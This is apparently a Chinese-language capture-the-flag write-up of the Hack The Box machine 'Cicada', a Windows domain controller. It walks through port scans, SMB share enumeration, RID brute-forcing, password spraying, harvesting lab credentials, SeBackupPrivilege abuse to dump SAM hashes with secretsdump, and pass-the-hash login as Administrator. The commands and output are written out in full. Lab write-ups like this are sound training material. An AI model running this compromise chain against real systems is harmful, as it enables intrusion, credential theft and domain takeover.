## port scan

```shell
# Nmap 7.94SVN scan initiated Sun Dec  1 23:00:42 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port -Pn 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.12s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
55863/tcp open  unknown
```

```shell
# Nmap 7.94SVN scan initiated Sun Dec  1 23:02:52 2024 as: nmap -sT -sV -sC -O -p53,88,135,139,389,445,464,593,636,3268,3269,55863 -oN nmap_results/detil 10.10.11.35
Nmap scan report for 10.10.11.35
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 10:49:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
55863/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h46m10s
| smb2-time: 
|   date: 2024-12-02T10:50:07
|_  start_date: N/A
```

`cicada.htb`

## smb

开放445端口，`smbclient`连接

```
smbclient -L 10.10.11.35
```

![image-20241202182931957](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202182931957.png)

查看`HR`目录

```
smbclient -N //10.10.11.35/HR
```

```
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
smb: \> get "Notice from HR.txt"
```

下载下来

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password
```

`Cicada$M6Corpb*@Lp#nZp!8`拿到一个默认密码

## rid 枚举

```bash
┌──(kali㉿kali)-[~/HackTheBox/Cicada]
└─$ sudo crackmapexec smb 10.10.11.35 -u "guest" -p "" --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [+] Brute forcing RIDs
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

`crackmapexec`工具进行密码喷洒

```
┌──(kali㉿kali)-[~/HackTheBox/Cicada]
└─$ sudo crackmapexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

`SMB   10.10.11.35  445  CICADA-DC [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

![image-20241202184318635](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202184318635.png)

## enum4linux-ng 枚举

```
enum4linux-ng -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
```

![image-20241202190048097](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202190048097.png)

在用户描述字段中找到了David的凭证：`aRt$Lp#7t*VQ!3`

枚举`david` 的共享文件

```
sudo crackmapexec smb 10.10.11.35 -d cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

查看`DEV`目录

```
smbclient //10.10.11.35/DEV -U david.orelious
```

拿到`Backup_script.ps1`的powershell脚本

```
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

`emily.oscars:Q!3@Lp#M6b*7t*Vt`

拿到一对凭据

## evil-winrm 登录

evil-winrm 登录 emily 

```
evil-winrm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35
```

Emily 用户具有`SeBackupPrivileges`权限

![image-20241202191632950](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202191632950.png)

```
此权限允许用户读取系统中的所有文件，我们将利用这一点。我们可以使用它从 Windows 复制SAM和SYSTEM文件，使用命令reg save hklm\sam和reg save hklm\system
```

```
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

![image-20241202191911174](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241202191911174.png)

```
*Evil-WinRM* PS C:\temp> download sam ./sam
                                        
Info: Downloading C:\temp\sam to ./sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system ./system
                                        
Info: Downloading C:\temp\system to ./system
                                        
Info: Download successful!
```

下载到本机

## impacket-secretsdump

```
impacket-secretsdump -sam sam -system system local
```

```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up..
```

```
evil-winrm -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341' -i 10.10.11.35
```

拿到administrator权限